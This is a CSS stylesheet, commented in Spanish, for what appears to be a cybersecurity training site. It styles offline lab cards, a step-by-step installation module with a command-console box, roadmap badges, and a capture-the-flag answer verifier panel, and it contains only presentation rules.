
@keyframes pi-spin {
  to {
    transform: rotate(360deg);
  }
}

.pi-desconectada-container {
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
  padding: 32px 24px;
  background: var(--superficie);
  border: 1px solid rgba(248, 113, 113, 0.3);
  border-radius: 16px;
  margin-bottom: 32px;
}

.pi-desconectada-icono {
  width: 56px;
  height: 56px;
  border-radius: 16px;
  background: rgba(248, 113, 113, 0.1);
  border: 1px solid rgba(248, 113, 113, 0.3);
  color: #f87171;
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 16px;
}

.pi-desconectada-icono svg {
  width: 30px;
  height: 30px;
}

.pi-desconectada-titulo {
  font-family: var(--fuente-display);
  font-size: 20px;
  font-weight: 700;
  color: #ffffff;
  margin-bottom: 8px;
}

.pi-desconectada-desc {
  font-size: 14px;
  color: var(--texto-muted);
  max-width: 560px;
  line-height: 1.5;
  margin-bottom: 28px;
}

.pi-desconectada-labs-vacios {
  width: 100%;
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
  gap: 20px;
  opacity: 0.55;
  pointer-events: none;
}

.cuadro-lab--offline {
  border-style: dashed;
  border-color: #374151 !important;
  background: rgba(17, 24, 39, 0.5);
}

.offline-icono {
  background: rgba(255, 255, 255, 0.04) !important;
  border-color: var(--borde) !important;
  color: #6b7280 !important;
}

.badge-offline {
  background: rgba(248, 113, 113, 0.12);
  color: #f87171;
  border: 1px solid rgba(248, 113, 113, 0.25);
  font-family: var(--fuente-mono);
  font-size: 11px;
  padding: 2px 8px;
  border-radius: 4px;
}

.offline-msg {
  color: #6b7280;
  font-style: italic;
}

.offline-footer {
  border-top-color: rgba(255, 255, 255, 0.05) !important;
}

.offline-cta {
  color: #6b7280 !important;
}

/* Vista completa de ModuloInstalacion */
.instalacion-vista {
  width: 100%;
  max-width: 900px;
  margin: 0 auto;
}

.instalacion-top-bar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 24px;
}

.instalacion-fase-label {
  font-family: var(--fuente-mono);
  font-size: 11px;
  font-weight: 700;
  color: #38bdf8;
  background: rgba(56, 189, 248, 0.12);
  border: 1px solid rgba(56, 189, 248, 0.25);
  padding: 4px 10px;
  border-radius: 6px;
  letter-spacing: 0.6px;
}

.instalacion-hero {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 16px;
  padding: 28px 32px;
  display: flex;
  gap: 24px;
  align-items: flex-start;
  margin-bottom: 24px;
}

.instalacion-hero-icono {
  width: 56px;
  height: 56px;
  border-radius: 14px;
  background: rgba(56, 189, 248, 0.12);
  border: 1px solid rgba(56, 189, 248, 0.3);
  color: #38bdf8;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}

.instalacion-hero-icono svg {
  width: 32px;
  height: 32px;
}

.instalacion-hero-texto {
  text-align: left;
}

.instalacion-hero-titulo {
  font-family: var(--fuente-display);
  font-size: 24px;
  font-weight: 700;
  color: #ffffff;
  margin-bottom: 8px;
}

.instalacion-hero-desc {
  font-size: 14px;
  color: var(--texto-muted);
  line-height: 1.55;
  margin-bottom: 14px;
}

.instalacion-herramientas-pills {
  display: flex;
  gap: 8px;
  flex-wrap: wrap;
}

.herramienta-pill {
  font-family: var(--fuente-mono);
  font-size: 11px;
  font-weight: 600;
  color: #38bdf8;
  background: rgba(56, 189, 248, 0.1);
  border: 1px solid rgba(56, 189, 248, 0.25);
  padding: 3px 10px;
  border-radius: 4px;
}

/* Barra de progreso en ModuloInstalacion */
.instalacion-progreso-bar-wrap {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 12px;
  padding: 16px 20px;
  margin-bottom: 24px;
}

.instalacion-progreso-info {
  display: flex;
  justify-content: space-between;
  align-items: center;
  font-family: var(--fuente-mono);
  font-size: 12px;
  color: var(--texto-muted);
  margin-bottom: 8px;
}

.instalacion-progreso-info strong {
  color: #38bdf8;
}

.instalacion-progreso-track {
  height: 6px;
  background: var(--superficie-alt);
  border-radius: 6px;
  overflow: hidden;
}

.instalacion-progreso-fill {
  height: 100%;
  background: linear-gradient(90deg, #38bdf8, #00e08a);
  border-radius: 6px;
  transition: width 0.3s ease;
}

/* Dots de navegación de pasos */
.instalacion-steps-nav {
  display: flex;
  gap: 6px;
  flex-wrap: wrap;
  justify-content: center;
  margin-bottom: 24px;
}

.instalacion-step-dot {
  width: 36px;
  height: 36px;
  border-radius: 8px;
  background: var(--superficie);
  border: 1px solid var(--borde);
  color: var(--texto-muted);
  font-family: var(--fuente-mono);
  font-size: 12px;
  font-weight: 700;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  transition: all 0.15s ease;
}

.instalacion-step-dot:hover {
  border-color: #38bdf8;
  color: #ffffff;
}

.instalacion-step-dot.dot-current {
  background: rgba(56, 189, 248, 0.15);
  border-color: #38bdf8;
  color: #38bdf8;
  box-shadow: 0 0 10px rgba(56, 189, 248, 0.3);
}

.instalacion-step-dot.dot-done {
  background: rgba(0, 224, 138, 0.15);
  border-color: #00e08a;
  color: #00e08a;
}

/* Panel del paso actual */
.instalacion-paso-panel {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 16px;
  padding: 32px;
  text-align: left;
  margin-bottom: 24px;
  transition: border-color 0.2s;
}

.instalacion-paso-panel.paso-completado {
  border-color: rgba(0, 224, 138, 0.4);
}

.instalacion-paso-header {
  display: flex;
  align-items: center;
  gap: 16px;
  margin-bottom: 24px;
  padding-bottom: 20px;
  border-bottom: 1px solid var(--borde);
}

.instalacion-paso-check {
  width: 28px;
  height: 28px;
  border-radius: 8px;
  border: 2px solid var(--borde);
  background: var(--superficie-alt);
  color: #06110c;
  font-weight: 800;
  font-size: 14px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  flex-shrink: 0;
  transition: all 0.2s ease;
}

.instalacion-paso-check:hover {
  border-color: #00e08a;
}

.instalacion-paso-check.check-on {
  background: #00e08a;
  border-color: #00e08a;
}

.instalacion-paso-meta {
  display: flex;
  flex-direction: column;
  gap: 2px;
}

.instalacion-paso-num {
  font-family: var(--fuente-mono);
  font-size: 11px;
  font-weight: 700;
  color: #38bdf8;
}

.instalacion-paso-titulo {
  font-family: var(--fuente-display);
  font-size: 20px;
  font-weight: 700;
  color: #ffffff;
  margin: 0;
}

.instalacion-paso-cuerpo {
  display: flex;
  flex-direction: column;
  gap: 14px;
  margin-bottom: 24px;
}

.instalacion-paso-parrafo {
  font-size: 14.5px;
  color: #d1d5db;
  line-height: 1.6;
  margin: 0;
  white-space: pre-line;
}

/* Consola de comandos */
.instalacion-consola {
  background: #080a0c;
  border: 1px solid var(--borde);
  border-radius: 10px;
  overflow: hidden;
  margin-bottom: 24px;
}

.instalacion-consola-bar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 8px 14px;
  background: rgba(255, 255, 255, 0.03);
  border-bottom: 1px solid var(--borde);
}

.instalacion-consola-tag {
  font-family: var(--fuente-mono);
  font-size: 11px;
  color: var(--texto-muted);
}

.instalacion-consola-copiar {
  background: transparent;
  border: none;
  color: #38bdf8;
  font-family: var(--fuente-mono);
  font-size: 11px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 4px;
}

.instalacion-consola-codigo {
  padding: 16px;
  margin: 0;
  font-family: var(--fuente-mono);
  font-size: 13px;
  color: #38bdf8;
  white-space: pre-wrap;
  word-break: break-all;
}

/* Navegación del paso */
.instalacion-paso-nav {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 16px;
  padding-top: 20px;
  border-top: 1px solid var(--borde);
}

.instalacion-contador {
  font-family: var(--fuente-mono);
  font-size: 12px;
  color: var(--texto-muted);
}

.btn-instalacion-next {
  background: #38bdf8;
  color: #06110c;
  font-weight: 600;
  border: none;
}

.btn-instalacion-next:hover {
  background: #7dd3fc;
  box-shadow: 0 0 12px rgba(56, 189, 248, 0.3);
}

.instalacion-completado-msg {
  display: flex;
  align-items: center;
  gap: 12px;
  background: rgba(0, 224, 138, 0.1);
  border: 1px solid rgba(0, 224, 138, 0.3);
  color: #00e08a;
  padding: 16px 24px;
  border-radius: 12px;
  font-family: var(--fuente-display);
  font-size: 14px;
  font-weight: 600;
}

.instalacion-completado-msg svg {
  width: 24px;
  height: 24px;
  flex-shrink: 0;
}

/* Ajustes de Roadmap para Fase 0 */
.fase-banner-instalacion {
  border-left: 4px solid #38bdf8;
  background: linear-gradient(90deg, rgba(56, 189, 248, 0.08) 0%, transparent 100%);
}

.fase-icon-instalacion {
  background: rgba(56, 189, 248, 0.15) !important;
  color: #38bdf8 !important;
  border: 1px solid rgba(56, 189, 248, 0.3);
}

.nodo-instalacion {
  border-color: rgba(56, 189, 248, 0.3) !important;
}

.nodo-instalacion:hover {
  border-color: #38bdf8 !important;
  box-shadow: 0 0 16px rgba(56, 189, 248, 0.2) !important;
}

.circulo-instalacion {
  border-color: #38bdf8 !important;
  color: #38bdf8 !important;
}

.badge-instalacion {
  background: rgba(56, 189, 248, 0.12) !important;
  color: #38bdf8 !important;
  border: 1px solid rgba(56, 189, 248, 0.3) !important;
}

.nodo-badge-instalacion-pill {
  font-family: var(--fuente-mono);
  font-size: 10px;
  font-weight: 700;
  color: #ffaa00;
  background: rgba(255, 170, 0, 0.12);
  border: 1px solid rgba(255, 170, 0, 0.3);
  padding: 1px 6px;
  border-radius: 4px;
}

/* ============================================================
   VERIFICADOR DE FLAG — Sistema de validación de aprendizaje
   ============================================================ */

/* Badge en las tarjetas de módulo */
.rl-mod-flag-badge {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  font-family: var(--fuente-mono);
  font-size: 9px;
  font-weight: 700;
  letter-spacing: 0.06em;
  color: var(--acento);
  background: rgba(0, 224, 138, 0.12);
  border: 1px solid rgba(0, 224, 138, 0.35);
  border-radius: 4px;
  padding: 2px 6px;
  line-height: 1;
}

.rl-mod-card--flag-ok {
  border-color: rgba(0, 224, 138, 0.35) !important;
}

/* Contenedor principal del verificador */
.vf-container {
  margin-top: 28px;
  background: linear-gradient(135deg, #0f1a12 0%, #111520 100%);
  border: 1px solid rgba(0, 224, 138, 0.25);
  border-radius: 14px;
  padding: 24px 26px;
  position: relative;
  overflow: hidden;
  animation: vf-aparecer 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
}

.vf-container::before {
  content: '';
  position: absolute;
  inset: 0;
  background: radial-gradient(ellipse 60% 40% at 50% 0%, rgba(0, 224, 138, 0.06) 0%, transparent 70%);
  pointer-events: none;
}

@keyframes vf-aparecer {
  from {
    opacity: 0;
    transform: translateY(16px) scale(0.97);
  }

  to {
    opacity: 1;
    transform: translateY(0) scale(1);
  }
}

/* Badge de flag verificada en el encabezado del paso */
.rl-paso-badge-flag-ok {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  font-family: var(--fuente-mono);
  font-size: 11px;
  font-weight: 700;
  color: var(--acento);
  background: rgba(0, 224, 138, 0.12);
  border: 1px solid rgba(0, 224, 138, 0.35);
  padding: 2px 8px;
  border-radius: 12px;
  margin-left: 8px;
  letter-spacing: 0.3px;
}
``

